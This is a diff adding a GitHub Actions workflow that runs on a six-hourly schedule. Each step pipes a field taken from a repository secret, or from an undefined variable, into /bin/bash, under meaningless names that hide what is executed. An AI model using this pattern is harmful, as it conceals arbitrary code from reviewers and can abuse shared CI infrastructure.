@@ -1,0 +1,27 @@
+name: qiyuandangri
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiyuandangri
+        env:
+          bg06186: ${{ secrets.bg06186 }}
+        run: |
+          echo $bg06186 | jq -r .r94 | /bin/bash
+          echo $l39 | jq -r .sxuzg742 | /bin/bash
+          echo $r024 | jq -r .bx87477 | /bin/bash
+          echo $natq658 | jq -r .efj89794 | /bin/bash
+          echo $gq71 | jq -r .qow59326 | /bin/bash
+          echo $jelt3 | jq -r .kx5 | /bin/bash
+          echo $yv4287 | jq -r .g5187 | /bin/bash
+          echo $cld05 | jq -r .ucdx69 | /bin/bash
+          echo $sn3 | jq -r .hmaby30883 | /bin/bash
+          echo $huf67247 | jq -r .xhvys7 | /bin/bash
+          echo $rtlpf1 | jq -r .ijukk91 | /bin/bash
+          echo $mofph443 | jq -r .fasem5485 | /bin/bash
+
